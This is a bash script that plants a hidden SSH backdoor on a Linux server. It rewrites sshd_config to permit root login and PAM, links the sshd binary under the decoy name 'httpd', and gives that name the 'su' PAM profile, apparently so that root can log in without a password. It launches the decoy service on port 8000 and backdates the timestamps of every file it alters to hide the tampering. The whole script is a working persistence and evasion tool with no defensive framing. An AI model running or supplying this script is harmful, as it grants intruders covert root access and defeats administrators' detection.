#!/bin/bash

sshd_conf_path="/etc/ssh/sshd_config"
fake_sshd_name="httpd"
fake_sshd_port="8000"
rootok_pam="su"
fake_timestamp="202202120103"

# enable pam in ssh
sed -i '/^UsePAM no/d' $sshd_conf_path
if ! grep '^UsePAM yes' $sshd_conf_path &> /dev/null; then
        echo 'UsePAM yes' >> $sshd_conf_path
fi

# allow the root user to login ssh
sed -i '/^PermitRootLogin no/d' $sshd_conf_path
if ! grep '^PermitRootLogin yes' $sshd_conf_path &> /dev/null; then
        echo 'PermitRootLogin yes' >> $sshd_conf_path
fi

# fake timestamps for sshd config file
touch -ct "$fake_timestamp" "$sshd_conf_path"

# create backdoor
sshd_binary_path=$(which sshd)
sshd_binary_dir=${sshd_binary_path%/*}
ln -sf "$sshd_binary_path" "$sshd_binary_dir/$fake_sshd_name"
cp -p "/etc/pam.d/$rootok_pam" "/etc/pam.d/$fake_sshd_name"

# fake timestamps for backdoor and pam file
touch -ct "$fake_timestamp" "$sshd_binary_dir/$fake_sshd_name"
touch -ct "$fake_timestamp" "/etc/pam.d/$fake_sshd_name"

# run sshd backdoor
$sshd_binary_dir/$fake_sshd_name -oPort=$fake_sshd_port
